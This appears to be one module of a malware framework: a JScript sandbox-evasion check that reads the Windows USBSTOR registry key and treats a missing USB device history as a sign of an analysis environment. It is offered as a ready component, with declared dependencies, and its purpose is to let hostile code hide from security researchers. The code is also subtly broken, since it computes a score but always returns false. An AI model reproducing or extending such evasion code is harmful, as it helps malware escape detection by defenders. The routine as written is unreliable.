// chunk: evasion/usb_history
// depends: core/run_cmd
// provides: check_usb
// format: jscript
// note: Checks USBSTOR registry key for USB device history. No USB history
//       is a strong sandbox indicator (real machines have plugged in devices).

function check_usb() {
    var score = 0;
    try {
        var out = _run('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR" 2>nul');
        var lines = out.split("\n");
        var deviceCount = 0;
        for (var i = 0; i < lines.length; i++) {
            if (lines[i].indexOf("USBSTOR\\") >= 0) deviceCount++;
        }
        if (deviceCount < 1) score++;
    } catch(e) {}
    return false;
}
